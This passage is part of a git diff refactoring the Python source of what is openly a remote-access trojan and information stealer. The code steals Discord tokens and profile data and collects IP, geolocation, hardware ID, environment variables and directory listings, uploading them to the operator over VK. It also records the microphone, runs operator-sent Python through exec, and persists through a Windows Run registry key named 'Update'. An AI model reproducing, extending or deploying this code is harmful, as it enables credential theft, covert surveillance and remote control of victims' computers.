+            debug_message("[Tags] Not found tags file, resetting to default!")
+        
+            # Reset tags.
+            reset_tags()
+    except Exception as exception:  # noqa
+        # If there is exception occurred.
+
+        # Showing debug message to the developer.
+        debug_message(f"[Tags] Failed to load tags, set tags to error! Exception - {exception}")
+
+        # Setting error tags.
+        __TAGS = get_error_tags()
+
+    # Message.
+    debug_message("[Tags] Loading complete!")
+
+
+def parse_tags(tags: str) -> list:
+    """ Parse tags for command calling. """
+
+    # TODO: Rename / refactor this function?.
+    # Returning.
+    return tags.replace("[", "").replace("]", "").split(",")
+
+
+def save_tags() -> None:
+    """ Saves tags to the file. """
+
+    # Globalising tags.
+    global __TAGS
+
+    try:
+        # Trying to save tags.
+
+        # Message.
+        debug_message("[Tags] Saving tags to the file...")
+
+        # Getting path.
+        path = __FOLDER + config["paths"]["tags"]
+
+        # Building path.
+        filesystem_build_path(path)
+
+        with open(path, "w", encoding="UTF-8") as tags_file:
+            # With opened file.
+
+            # Writing tags.
+            tags_file.write(str(__TAGS))
+    except Exception as exception:  # noqa
+        # If there is exception occurred.
+
+        # Showing debug message to the developer.
+        debug_message(f"[Tags] Failed to save tags! Exception - {exception}")
+
+
+# Folder path.
+
+def set_folder_path() -> None:
+    """ Sets folder path to path from config. """
+
+    # Globalize folder variable.
+    global __FOLDER
+
+    # Setting folder.
+    __FOLDER = os.getenv("APPDATA") + config["paths"]["main"]
+
+
+def get_folder_path() -> str:
+    """ Returns folder path. """
+
+    # Globalize folder variable.
+    global __FOLDER
+
+    # Returning folder.
+    return __FOLDER
+
+
+# Utils.
+
+def list_intersects(list_a: list, list_b: list) -> bool:
+    """ Returns true if any of the item is intersects. """
+
+    # Checking intersection.
+    for _item in list_a:
+        # For items in list A.
+
+        if _item in list_b:
+            # If item in list B.
+
+            # Return True.
+            return True
+
+    # No intersection.
+    return False
+
+
+def list_difference(list_a, list_b) -> list:
+    """ Function that returns difference between given two lists. """
+
+    # Returning.
+    return [element for element in list_a if element not in list_b]
+
+
+def get_operating_system() -> str:
+    """ Returns current operating system. """
+
+    if sys.platform.startswith("win32"):
+        # If this is windows.
+
+        # Returning windows.
+        return "Windows"
+
+    if sys.platform.startswith("linux"):
+        # If this is linux.
+
+        # Returning linux.
+        return "Linux"
+
+    # Unsupported operating system
+    return "!UNSUPPORTED_OS!"
+
+
+def get_hwid() -> str:
+    """ Returns system unique hardware index. """
+
+    try:
+        # Trying to get HWID
+
+        # Command to execute.
+        hwid_grab_command = "wmic csproduct get uuid"
+
+        # Opening process.
+        _process = subprocess.Popen(hwid_grab_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                    stderr=subprocess.PIPE)
+
+        # Returning HWID.
+        return str((_process.stdout.read() + _process.stderr.read()).decode().split("\n")[1])
+    except Exception as exception:  # noqa
+        # If there is exception occurred.
+
+        # Showing debug message to the developer.
+        debug_message(f"[HWID] Failed to grab from the system! Exception - {exception}")
+
+        # Returning default.
+        return "00000000-0000-0000-0000-000000000000"
+
+
+def get_ip() -> dict:
+    """ Returns IP information. """
+
+    try:
+        # Trying to get IP.
+
+        # API Provider.
+        api_provider = "https://ipinfo.io/json"
+
+        # Returning JSON data.
+        return requests.get(api_provider).json()
+    except Exception as exception:  # noqa
+        # If there is exception occurred.
+
+        # Showing debug message to the developer.
+        debug_message(f"[IP] Failed to grap IP from the system! Exception - {exception}")
+
+        # Returning zero-ip.
+        return "0.0.0.0.0"
+
+
+def get_environment_variables() -> dict:
+    """ Returns list of all environment variables in system. """
+
+    # TODO: Rename / refactor this function?.
+    return {variable: os.environ.get(variable) for variable in os.environ}
+
+
+def executable_get_extension() -> str:
+    """ Returns current executable extension. """
+
+    # Return.
+    return sys.argv[0].split(".")[-1]
+
+
+def record_microphone(path, seconds: int = 1) -> None:
+    """ Records microphone. """
+
+    # Importing.
+    try:
+        # Trying to import modules.
+
+        # Importing.
+        import pyaudio
+        import wave
+    except ImportError:
+        # If there is import error.
+
+        # Not supported.
+        debug_message("[Microphone] Recording microphone is not supported on selected PC! (opencv-python (CV2) module is not installed)")  # noqa
+
+        # Returning.
+        return
+
+    # Creating audio port.
+    audio = pyaudio.PyAudio()
+
+    # Opening audio stream.
+    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, frames_per_buffer=1024, input=True)
+
+    # Frames list.
+    frames = []
+
+    # Writing data stream.
+    for _ in range(0, int(44100 / 1024 * int(seconds))):
+        data = stream.read(1024)
+        frames.append(data)
+
+    # Stopping.
+    stream.stop_stream()
+    stream.close()
+    audio.terminate()
+
+    # Validating filename.
+    filesystem_build_path(path)
+
+    # Save recording as wav file.
+    file = wave.open(path, 'wb')
+    file.setnchannels(1)
+    file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
+    file.setframerate(44100)
+    file.writeframes(b''.join(frames))
+    file.close()
+
+
+# Commands.
 
 def initialise_commands() -> None:
-    # @function initialise_commands()
-    # @returns None
-    # @description Function that initialises commands.
-
+    """ Initialises commands. """
     # Globalising command functions and help.
     global __COMMANDS_FUNCTION
     global __COMMANDS_HELP
@@ -1401,482 +2357,10 @@ def initialise_commands() -> None:
     }
 
 
-def exit_handler() -> None:
-    # @function exit_handler()
-    # @returns None
-    # @description Function that handles exit of the app.
-
-    # Debug message.
-    debug_message("Exiting app!")
-
-    # Sever message.
-    server_message(f"Disconnected from the network!")
-
-
-def server_connect() -> None:
-    # @function server_connect()
-    # @returns None
-    # @description Function that connects to the server.
-
-    # Globalising variables.
-    global __SERVER_API
-    global __SERVER_BOT
-
-    try:
-        # Trying to connect to server.
-
-        __SERVER_API = vk_api.VkApi(token=config["server_vk_group_access_token"])
-        __SERVER_BOT = vk_api.bot_longpoll.VkBotLongPoll(__SERVER_API, config["server_vk_group_index"])
-    except Exception as _exception:  # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function server_connect()! "
-                      f"Full exception information - {_exception}")
-
-        # Exiting.
-        raise SystemExit
-
-    # Debug message.
-    debug_message("Connected to the server!")
-
-
-def debug_message(_message: str) -> None:
-    # @function debug_message()
-    # @returns None
-    # @description Function that shows debug message if debug message is enabled.
-
-    if not DEBUG:
-        # If debug is not enabled.
-
-        # Returning.
-        return
-
-    # Printing message.
-    print(_message)
-
-
-def get_operating_system() -> str:
-    # @function get_operating_system()
-    # @returns str
-    # @description Function that return current operating system.
-
-    if sys.platform.startswith('win32'):
-        # If this is windows.
-
-        # Returning windows.
-        return "Windows"
-
-    if sys.platform.startswith('linux'):
-        # If this is linux.
-
-        # Returning linux.
-        return "Linux"
-
-    # Unsupported operating system
-    return "!UNSUPPORTED_OS!"
-
-
-def server_listen() -> None:
-    # @function server_listen()
-    # @returns None
-    # @description Function that listen server for the new message.
-
-    if __SERVER_BOT is None:
-        # If server bot is none.
-
-        # Returning.
-        return
-
-    while True:
-        # Infinity loop.
-
-        try:
-            # Trying to listen.
-
-            for _event in __SERVER_BOT.listen():  # noqa
-                # For every message event in the server bot listening.
-
-                if _event.type == vk_api.bot_longpoll.VkBotEventType.MESSAGE_NEW:
-                    # If this is message event.
-
-                    # Processing client-server answer.
-                    client_answer_server(_event)
-        except Exception as _exception:  # noqa
-            # If there is exception occurred.
-
-            # Showing debug message to the developer.
-            debug_message(f"Oops... Exception occurred in function server_listen()! "
-                          f"Full exception information - {_exception}")
-
-
-def load_tags() -> None:
-    # @function load_tags()
-    # @returns None
-    # @description Function that loads all tags data.
-
-    # Globalising tags.
-    global __TAGS
-
-    try:
-        # Trying to load tags.
-
-        # Getting path.
-        _path = __FOLDER + "tags.dat"
-
-        # Building path.
-        filesystem_build_path(_path)
-
-        if os.path.exists(_path):
-            # If we have tags file.
-
-            try:
-                # Trying to read tags.
-
-                # Clearing tags list.
-                __TAGS = []
-
-                with open(_path, "r", encoding="UTF-8") as _tf:
-                    # With opened file.
-
-                    # Reading tags.
-                    __TAGS = eval(_tf.read())
-            except Exception as _exception:  # noqa
-                # If there is exception occurred.
-
-                # Debug message.
-                debug_message(f"Can`t load tags file! Exception: {_exception}")
-
-                # Tags list.
-                __TAGS = [get_ip()["ip"], get_operating_system(), "PC"]  # noqa
-
-                if not DISABLE_HWID:
-                    # If we don't disable HWID.
-
-                    # Adding HWID.
-                    __TAGS.append(get_hwid())
-
-                # Saving tags.
-                save_tags()
-        else:
-            # If we don't have tags file.
-
-            # Tags list.
-            __TAGS = [get_ip()["ip"], get_operating_system(), "PC"]  # noqa
-
-            if not DISABLE_HWID:
-                # If we don't disable HWID.
-
-                # Adding HWID.
-                __TAGS.append(get_hwid())
-
-            # Saving tags.
-            save_tags()
-    except Exception as _exception:  # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function load_tags()! "
-                      f"Full exception information - {_exception}")
-
-        # Settings default PC + LOAD_TAGS_ERROR tags.
-        __TAGS = ["PC", "LOAD_TAGS_ERROR"]
-
-
-def get_hwid() -> str:
-    # @function get_hwid()
-    # @returns str
-    # @description Function that return unique hardware index.
-
-    # Default HWID.
-    _DEFAULT = "00000000-0000-0000-0000-000000000000"
-
-    try:
-        # Trying to get HWID
-
-        # Command to execute.
-        _command = "wmic csproduct get uuid"
-
-        # Opening process.
-        _process = subprocess.Popen(_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                    stderr=subprocess.PIPE)
-
-        # Returning HWID.
-        return str((_process.stdout.read() + _process.stderr.read()).decode().split("\n")[1])
-    except Exception as _exception:  # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function get_hwid()! "
-                      f"Full exception information - {_exception}")
-
-        # Returning default.
-        return _DEFAULT
-
-
-def get_ip():
-    # @function get_ip()
-    # @returns Dict
-    # @description Function that returns ip address of the client machine.
-
-    try:
-        # Trying to get IP.
-
-        # API Provider.
-        _api_provider = "https://ipinfo.io/json"
-
-        # Returning JSON data.
-        return requests.get(_api_provider).json()
-    except Exception as _exception:  # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function get_ip()! "
-                      f"Full exception information - {_exception}")
-
-        # Returning zero-ip.
-        return "0.0.0.0.0"
-
-
-def get_environment_variables() -> dict:
-    # @function get_environment_variables()
-    # @returns dict
-    # @description Function that returns list of the all environment variables in the system.
-
-    # All environment variables.
-    _environment_variables = {}
-
-    for _environment_variable in os.environ:
-        # For every variable in environ.
-
-        # Adding current variable to all variables
-        _environment_variables[_environment_variable] = os.getenv(_environment_variable)
-
-    # Returning variables.
-    return _environment_variables
-
-
-def list_intersects(_list_one: list, _list_two: list) -> bool:
-    # @function list_intersects()
-    # @returns bool
-    # @description Function that returns is two list is intersects or not.
-
-    # Checking intersection.
-    for _item in _list_one:
-        # For items in list one.
-
-        if _item in _list_two:
-            # If item in list two.
-
-            # Return True.
-            return True
-
-    # No intersection.
-    return False
-
-
-def parse_tags(_tags: str) -> list:
-    # @function parse_tags()
-    # @returns list
-    # @description Function that returns list from the string of the tags.
-
-    # Returning.
-    return _tags.replace("[", "").replace("]", "").split(",")
-
-
-def save_tags() -> None:
-    # @function save_tags()
-    # @returns None
-    # @description Function that saves tags to the file.
-
-    # Globalising tags.
-    global __TAGS
-
-    try:
-        # Trying to save tags.
-
-        # Getting path.
-        _path = __FOLDER + "tags.dat"
-
-        # Building path.
-        filesystem_build_path(_path)
-
-        with open(_path, "w", encoding="UTF-8") as _tf:
-            # With opened file.
-
-            # Writing tags.
-            _tf.write(str(__TAGS))
-    except Exception as _exception:  # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function save_tags()! "
-                      f"Full exception information - {_exception}")
-
-
-def server_method(method: str, parameters: dict, _isretry=False) -> any:
-    # @function server_method()
-    # @returns any
-    # @description Function that calls server method.
-
-    if __SERVER_API is None:
-        # If no server API.
-
-        # return.
-        return
-
-    try:
-        # Trying to call method.
-
-        if "random_id" not in parameters:
-            # If there is no random id.
-
-            # Adding random id.
-            parameters["random_id"] = vk_api.utils.get_random_id()
-
-        # Executing method.
-        return __SERVER_API.method(method, parameters)  # noqa
-    except Exception as Error:
-        # Error.
-
-        # Message.
-        debug_message(f"Error when trying to call server method (API)! Error: {Error}")
-
-        if _isretry or config["server_vk_retry_method_call_on_fail"]:
-            # If this is already retry.
-
-            # Returning.
-            return
-        else:
-            # If this is not retry.
-
-            # Retrying.
-            return server_method(method, parameters, True)
-
-
-def server_message(_text: str, _attachmment: str = None, _peer_index: int = None) -> None:
-    # @function server_message()
-    # @returns any
-    # @description Function that sends message to the server.
-
-    # Globalising name.
-    global __NAME
-
-    if _peer_index is None:
-        # If peer index is not specified.
-
-        for _admin_peer_index in config["server_vk_allowed_users"]:
-            # For every peer index in admins peer indices.
-
-            # Sending messages to they.
-            server_message(_text, _attachmment, _admin_peer_index)
-
-        # Returning.
-        return
-
-    # Adding name to the text.
-    _text = f"<{__NAME}>\n{_text}"
-
-    # Debug message.
-    debug_message("Sent new message!")
-
-    # Calling method.
-    server_method("messages.send", {
-        "message": _text,
-        "attachment": _attachmment,
-        "peer_id": _peer_index})
-
-
-def save_name() -> None:
-    # @function save_name()
-    # @returns None
-    # @description Function that saves name to the file.
-
-    try:
-        # Trying to save name.
-
-        # Getting path.
-        _path = __FOLDER + "name.dat"
-
-        # Building path.
-        filesystem_build_path(_path)
-
-        with open(_path, "w", encoding="UTF-8") as _tf:
-            # With opened file.
-
-            # Writing name.
-            _tf.write(str(__NAME))
-    except Exception as _exception:  # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function save_name()! "
-                      f"Full exception information - {_exception}")
-
-
-def load_name() -> None:
-    # @function load_name()
-    # @returns None
-    # @description Function that loads all name data.
-
-    # Globalising name.
-    global __NAME
-
-    try:
-        # Trying to load name.
-
-        # Getting path.
-        _path = __FOLDER + "name.dat"
-
-        # Building path.
-        filesystem_build_path(_path)
-
-        if os.path.exists(_path):
-            # If we have name file.
-
-            try:
-                # Trying to read name.
-
-                # Clearing name.
-                __NAME = ""
-
-                with open(_path, "r", encoding="UTF-8") as _nf:
-                    # With opened file.
-
-                    # Reading name.
-                    __NAME = str(_nf.read())
-            except Exception as _exception:  # noqa
-                # If there is exception occurred.
-
-                # Debug message.
-                debug_message(f"Can`t load name file! Exception: {_exception}")
-
-                # Name.
-                __NAME = get_ip()["ip"]  # noqa
-
-                # Saving name.
-                save_name()
-        else:
-            # If we don't have name file.
-
-            # Name.
-            __NAME = get_ip()["ip"]  # noqa
-
-            # Saving name.
-            save_name()
-    except Exception as _exception:  # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function load_name()! "
-                      f"Full exception information - {_exception}")
-
-        # Name.
-        __NAME = get_ip()["ip"]  # noqa
-
+# Discord.
 
 def discord_api_call(method: str, params: dict, func, data, token: str) -> any:
-    # @description Calls Discord API method.
+    """ Calls Discord API. """
 
     # This code is from -> gtihub.com/kirillzhosul/python-discord-token-grabber
     # (My repo)
@@ -1893,36 +2377,32 @@ def discord_api_call(method: str, params: dict, func, data, token: str) -> any:
     )
 
 
-def stealer_steal_discord_profile(_tokens: list[str] = None) -> dict:
-    # @function stealer_steal_discord_profile(_tokens: list[str]=None) -> dict
-    # @returns Dict or none
-    # @description Function that steals all profile information from client Discord.
+# Stealer.
 
-    if _tokens is None:
+def stealer_steal_discord_profile(tokens: list[str] = None) -> dict:
+    """ Steals all discord profile information. """
+
+    if tokens is None:
         # If tokens is not given.
 
         # Grabbing tokens from system.
-        _tokens = stealer_steal_discord_tokens()
+        tokens = stealer_steal_discord_tokens()
 
-    if len(_tokens) == 0:
-        # If not tokens.
+    if not tokens:
+        # If no tokens.
 
         # Returning None.
         return None
 
     # Returning API response.
-    return discord_api_call("users/@me", {}, requests.get, None, _tokens[0]).json()
+    return discord_api_call("users/@me", {}, requests.get, None, tokens[0]).json()
 
 
 def stealer_steal_discord_tokens() -> list[str]:
-    # @function stealer_steal_discord_token()
-    # @returns List
-    # @description Function that steals all the tokens from discord.
+    """ Steas all discord tokens. """
 
     # This code is from -> gtihub.com/kirillzhosul/python-discord-token-grabber
     # (My repo)
-
-    # Modules.
 
     # Paths where tokens exists.
     paths = [
@@ -1946,7 +2426,7 @@ def stealer_steal_discord_tokens() -> list[str]:
             # For log files in folder.
 
             # Opening file.
-            file = open(f'{token_path}\\{log_file}', errors='ignore')
+            file = open(f"{token_path}\\{log_file}", errors="ignore")
 
             for line in [line.strip() for line in file.readlines() if line.strip()]:
                 # Getting all lines.
@@ -1968,406 +2448,61 @@ def stealer_steal_discord_tokens() -> list[str]:
     return list(set(tokens))
 
 
-def stealer_steal_data(_force: bool = False):
-    # @function stealer_steal_data()
-    # @returns None
-    # @description Function that steals all the data from the client.
-
-    # Globalising values.
-    global __VALUES
-
-    try:
-        # Trying to steal.
-
-        if not stealer_is_already_worked() or _force:
-            # If we not already stolen data or forcing.
-
-            # Getting file name.
-            _path = __FOLDER + "log.json"
-
-            # Getting ip data.
-            _ip = get_ip()
-
-            # Getting path data.
-            _userprofile = os.getenv("userprofile")
-            _drive = os.getcwd().split("\\")[0]
-
-            # Writing values.
-            __VALUES["internet_ipaddress"] = _ip["ip"]  # noqa
-            __VALUES["internet_city"] = _ip["city"]  # noqa
-            __VALUES["internet_country"] = _ip["country"]  # noqa
-            __VALUES["internet_region"] = _ip["region"]  # noqa
-            __VALUES["internet_provider"] = _ip["org"]  # noqa
-
-            if not DISABLE_HWID:
-                # If HWID is not disabled.
-
-                # Writing HWID.
-                __VALUES["computer_hardware_index"] = get_hwid()
-
-            if not sys.platform.startswith('linux'):
-                # If not linux.
-
-                # Windows values.
-                __VALUES["computer_username"] = os.getenv("UserName")
-                __VALUES["computer_name"] = os.getenv("COMPUTERNAME")
-                __VALUES["computer_operating_system"] = os.getenv("OS")
-                __VALUES["computer_processor"] = os.getenv("NUMBER_OF_PROCESSORS") + " cores "
-                __VALUES["computer_processor"] += os.getenv("PROCESSOR_ARCHITECTURE") + " "
-                __VALUES["computer_processor"] += os.getenv("PROCESSOR_IDENTIFIER") + " "
-                __VALUES["computer_processor"] += os.getenv("PROCESSOR_LEVEL") + " "
-                __VALUES["computer_processor"] += os.getenv("PROCESSOR_REVISION")
-                __VALUES["computer_environment_variables"] = get_environment_variables()
-                __VALUES["directory_downloads"] = filesystem_try_listdir(_userprofile + "\\Downloads")
-                __VALUES["directory_documents"] = filesystem_try_listdir(_userprofile + "\\Documents")
-                __VALUES["directory_desktop"] = filesystem_try_listdir(_userprofile + "\\Desktop")
-                __VALUES["directory_root"] = filesystem_try_listdir(_drive + "\\")
-                __VALUES["directory_programfiles"] = filesystem_try_listdir(_drive + "\\Program Files")
-                __VALUES["directory_programfiles86"] = filesystem_try_listdir(_drive + "\\Program Files (x86)")
-                # Disable as may take too long time to execute?
-                # __VALUES["discord_tokens"] = stealer_steal_discord_tokens()
-                # __VALUES["discord_profile"] = stealer_steal_discord_profile(__VALUES["discord_tokens"])
-
-            # Building path.
-            filesystem_build_path(_path)
-
-            with open(_path, "w") as _file:
-                # With opened file.
-
-                # Dumping.
-                json.dump(__VALUES, _file, indent=4)
-
-            for _peer in config["server_vk_allowed_users"]:
-                # For every peer in admins.
-
-                # Uploading document.
-                _uploading_result = server_upload_document(_path, "Log File", _peer, "doc")
-
-                # Message.
-                if type(_uploading_result) == str:
-                    # If all is ok.
-
-                    # Message.
-                    server_message(f"[Stealer] Stolen data:", _uploading_result, _peer)
-                else:
-                    # If there is error.
-
-                    # Message.
-                    server_message(f"[Stealer] Error when uploading stolen data: {_uploading_result}", None, _peer)
-
-            # Returning value.
-            return __VALUES
-    except Exception as _exception:  # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function steal_data()! "
-                      f"Full exception information - {_exception}")
-
-        # Returning value.
-        return {_exception}
-
-
-def user_is_admin(_peer: str) -> bool:
-    # @function user_is_admin()
-    # @returns None
-    # @description Function that returns is given user is admin or not.
-
-    # Read admins.
-    admins = config["server_vk_allowed_users"]
-
-    if admins is None or len(admins) == 0:
-        # If there is no admins in the list
-
-        # Returning true as there is no admins.
-        return True
-
-    # Returning.
-    return _peer in admins
-
-
-def client_answer_server(_event) -> None:
-    # @function client_answer_server()
-    # @returns None
-    # @description Function that process message from the remote access (server).
-
-    # Getting text from the event.
-    _text = _event.message.text
-
-    # Getting peer from the event.
-    _peer = _event.message.peer_id
-
-    # Text of the response.
-    _response_text = None
-
-    # Attachment of the response.
-    _response_attachment = None
-
-    try:
-        # Trying to answer.
-
-        # Getting arguments from the message (Message split by space).
-        _message_arguments = _text.split(";")
-
-        if len(_message_arguments) == 0:
-            # If empty.
-
-            # Returning.
-            return
-
-            # Getting tags.
-        _message_tags = _message_arguments[0]
-        _message_arguments.pop(0)
-
-        if _message_tags == "alive":
-            # If this is network command (That is work without tags and for all).
-
-            if user_is_admin(_peer):
-                # If user is admin and allowed to make commands.
-
-                # Getting current time.
-                _current_time = datetime.datetime.now().strftime("%H:%M:%S")
-
-                # Answering that we in network.
-                _response_text = f"Alive! Time: {_current_time}"
-            else:
-                # If not is admin.
-
-                # Answering with an error.
-                _response_text = MESSAGE_NOT_ADMIN
-        else:
-            # If this is not alive command.
-
-            if list_intersects(parse_tags(_message_tags), __TAGS):
-                # If we have one or more tag from our tags.
-
-                if user_is_admin(_peer):
-                    # If user is admin.
-
-                    if len(_message_arguments) == 0:
-                        # If there is no tags + command.
-
-                        # Responding with error.
-                        _response_text = "Invalid request! Message can`t be parsed! Try: tag1, tag2; command; args"
-                    else:
-                        # If there is no error.
-
-                        # Getting command itself.
-                        _message_command = str(_message_arguments[0]).lower().replace(" ", "")
-                        _message_arguments.pop(0)
-
-                        # Getting arguments (Joining all left list indices together).
-                        _command_arguments = ";".join(_message_arguments)
-
-                        # Executing command.
-                        _execution_response = client_execute_command(_message_command, _command_arguments, _event)
-
-                        if type(_execution_response) == list:
-                            # If response is list.
-
-                            # Uploading attachment to the message.
-
-                            if len(_execution_response) < 3:
-                                # If invalid length.
-
-                                # Getting error response.
-                                _response_text = "Invalid attachment response from the executing of command!"
-                            else:
-                                # If all correct.
-
-                                # Uploading.
-
-                                # Getting values.
-                                _uploading_path = _execution_response[0]
-                                _uploading_title = _execution_response[1]
-                                _uploading_type = _execution_response[2]
-
-                                if _uploading_type == "photo":
-                                    # If this is just photo.
-
-                                    # Uploading photo on the server.
-                                    _uploading_result = server_upload_photo(_uploading_path)
-
-                                    # Moving result to attachment.
-                                    _response_text = _uploading_title
-                                    _response_attachment = _uploading_result
-                                elif _uploading_type in ("doc", "audio_message"):
-                                    # If this is document or audio message.
-
-                                    # Uploading file on the server.
-                                    _uploading_result = server_upload_document(_uploading_path, _uploading_title,
-                                                                               _peer, _uploading_type)
-
-                                    if type(_uploading_result) == str:
-                                        # If uploading file result is string then all OK.
-
-                                        # Setting response.
-                                        _response_text = _uploading_title
-                                        _response_attachment = _uploading_result
-                                    else:
-                                        # If there is an error.
-
-                                        # Setting response.
-                                        _response_text = f"Error when uploading document: {_uploading_result}"
-
-                                    # Trying to delete.
-                                    filesystem_try_delete(_uploading_path)
-                        else:
-                            # If default string response.
-                            # Getting text.
-                            _response_text = _execution_response
-                else:
-                    # If not is admin.
-
-                    # Answering with an error.
-                    _response_text = MESSAGE_NOT_ADMIN
-            else:
-                # If lists of tags not intersects.
-
-                # Returning.
-                return
-    except Exception as _exception:  # noqa
-        # If there an exception.
-
-        # Getting exception answer.
-        _response_text = f"Oops... There is exception while client try to answer message. " \
-                         f"Exception information: {_exception}"
-
-    # Answering server.
-    if _response_text is not None:
-        # If response was not void from execution function.
-
-        # Answering.
-        server_message(f"{_response_text}", _response_attachment, _peer)
-    else:
-        # None answer.
-        server_message(f"Void... (No response)", _response_attachment, _peer)
-
-
 def stealer_is_already_worked() -> bool:
-    # @function stealer_is_already_worked()
-    # @returns bool
-    # @description Function that returns is we already worked stealer or not.
+    """ Returns true if stealer already worked. """
 
-    # Getting path to secret file.
-    _path = __FOLDER + "version.dat"
+    # Getting path to anchor file.
+    path = __FOLDER + config["paths"]["anchor"]
 
-    if not os.path.exists(_path):
-        # If secret file not exists.
+    if not os.path.exists(path):
+        # If anchor file not exists.
 
         # Validating file.
-        filesystem_build_path(_path)
+        filesystem_build_path(path)
 
         # Creating file.
-        with open(_path, "w") as _file:
-            _file.write("")
+        with open(path, "w") as anchor_file:
+            anchor_file.write("Anchor")
 
-        # Returning false.
+        # Returning that not worked.
         return False
 
-    # Returning true if file exists.
+    # Returning true if worked.
     return True
 
 
-def server_upload_photo(_path: str) -> str:
-    # @function server_upload_photo()
-    # @returns str
-    # @description Function that  uploads photo on the server.
-
-    # Getting uploader.
-    _uploader = vk_api.upload.VkUpload(__SERVER_API)
-
-    # Uploading photo.
-    _photo = _uploader.photo_messages(_path)
-    _photo = _photo[0]
-
-    if "owner_id" in _photo and "id" in _photo and "access_key" in _photo:
-        # If photo have all those fields.
-
-        # Getting photo fields.
-        _owner_id = _photo['owner_id']
-        _photo_id = _photo['id']
-        _access_key = _photo['access_key']
-
-        # Returning photo URN.
-        return f'photo{_owner_id}_{_photo_id}_{_access_key}'
-
-    # Returning blank.
-    return ""
-
-
-def execute_python(_code: str, _globals: dict, _locals: dict) -> any:
-    # @function server_upload_photo()
-    # @returns any
-    # @description Function that executes python code and returns it out in variable out.
-
-    # Getting global out.
-    global out
-
-    # Getting clean code.
-    _clean_code = _code.replace("&gt;", ">").replace("&lt;", "<").replace('&quot;', "'").replace('&tab', '   ')
-
-    try:
-        # Trying to execute.
-
-        # Executing replaced code.
-        exec(_clean_code, _globals, _locals)
-    except Exception as _exception:  # noqa
-        # If there is an error.
-
-        # Returning.
-        return f"Python code exception: {_exception}"
-
-    try:
-        # Trying to return out.
-
-        # Returning out.
-        return out
-    except NameError:
-        # If there is an name error.
-
-        # Returning.
-        return f"Python code does not return output! Write in out"
-
-
-def client_execute_command(_command_name: str, _arguments: str, _event) -> str:
-    # @function client_execute_command()
-    # @returns str
-    # @description Function that executes python code and returns it out in variable out.
-
-    for _command in __COMMANDS_FUNCTION:  # noqa
-        # For all commands names in commands dict.
-
-        if _command_name == _command:
-            # If it is this commands.
-
-            # Executing command and returning result.
-            return __COMMANDS_FUNCTION[_command](_arguments, _event)  # noqa
-
-    # Default answer.
-    return f"Invalid command {_command_name}! Write help command and get all commands!"
-
+# Autorun.
 
 def autorun_register() -> None:
-    # @function autorun_register()
-    # @returns None
-    # @description Function that registers current executable file to the autorun.
+    """ Registers current file (if executeble). """
 
     if DISABLED_AUTORUN:
         # If autorun is disabled.
 
+        # Debug message.
+        debug_message("[Autorun] Not regitering, as disabled...")
+
         # Return.
         return
 
-    if executable_get_extension != "exe":
+    if executable_get_extension() != "exe":
         # If this is not exe file.
 
         # Debug message.
-        debug_message("Not add self in the autorun as currently running not executable file (.exe)")
+        debug_message("[Autorun] Not regitering, as running not from final executable file (not a .exe)")
 
         # Returning.
         return
 
+    if not sys.platform.startswith("win32"):
+        # If not windows family.
+        
+        # Debug message.
+        debug_message("[Autorun] Not regitering, as running not from Windows-Family OS.")
+
+        # Returning.
+        return
+    
     try:
         # Trying to import winreg module.
 
@@ -2377,7 +2512,7 @@ def autorun_register() -> None:
         # If there is ImportError.
 
         # Debug message.
-        debug_message("Cannot add self to the autorun! Could not import module winreg")
+        debug_message("[Autorun] Failed to regiter self to the autorun! Could not import module winreg that is required for that!")
 
         # Returning.
         return
@@ -2386,35 +2521,36 @@ def autorun_register() -> None:
         # Trying to add to the autorun.
 
         # Getting executable path.
-        _executable_path = __FOLDER + "update." + executable_get_extension()
+        executable_filename = config["autorun"]["executable"]
+        executable_path = f"{__FOLDER}{executable_filename}.{executable_get_extension()}"
 
-        if not os.path.exists(_executable_path):
+        if not os.path.exists(executable_path):
             # If no file there (We don't add this already.
 
             # Building path.
-            filesystem_build_path(_executable_path)
+            filesystem_build_path(executable_path)
 
             # Copying executable there.
-            shutil.copyfile(sys.argv[0], _executable_path)
+            shutil.copyfile(sys.argv[0], executable_path)
 
         # Opening key.
-        _registry_key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
-                                       sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                                       reserved=0, access=winreg.KEY_ALL_ACCESS)
+        registry_key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
+                                      sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                      reserved=0, access=winreg.KEY_ALL_ACCESS)
 
         # Adding autorun.
-        winreg.SetValueEx(_registry_key, "Update", 0, winreg.REG_SZ, _executable_path)
+        winreg.SetValueEx(registry_key, config["autorun"]["name"], 0, winreg.REG_SZ, executable_path)
 
         # Closing key.
-        winreg.CloseKey(_registry_key)
+        winreg.CloseKey(registry_key)
 
         # Debug message.
-        debug_message("Add self to the registry OK!")
-    except Exception as _exception:  # noqa
+        debug_message("[Autorun] Successfully regitering self to the registry!")
+    except Exception as exception:  # noqa
         # If error occurred.
 
         # Debug message.
-        debug_message(f"Can`t add self to the registry! Error: {_exception}")
+        debug_message(f"[Autorun] Failed to regiter self to the registry! Exception - {exception}")
 
 
 def autorun_unregister() -> None:
@@ -2425,15 +2561,30 @@ def autorun_unregister() -> None:
     if DISABLED_AUTORUN:
         # If autorun is disabled.
 
+        # Debug message.
+        debug_message("[Autorun] Not unregistering, as disabled...")
+
         # Return.
         return
 
-    if executable_get_extension != "exe":
+    if executable_get_extension() != "exe":
         # If this is not exe file.
+
+        # Debug message.
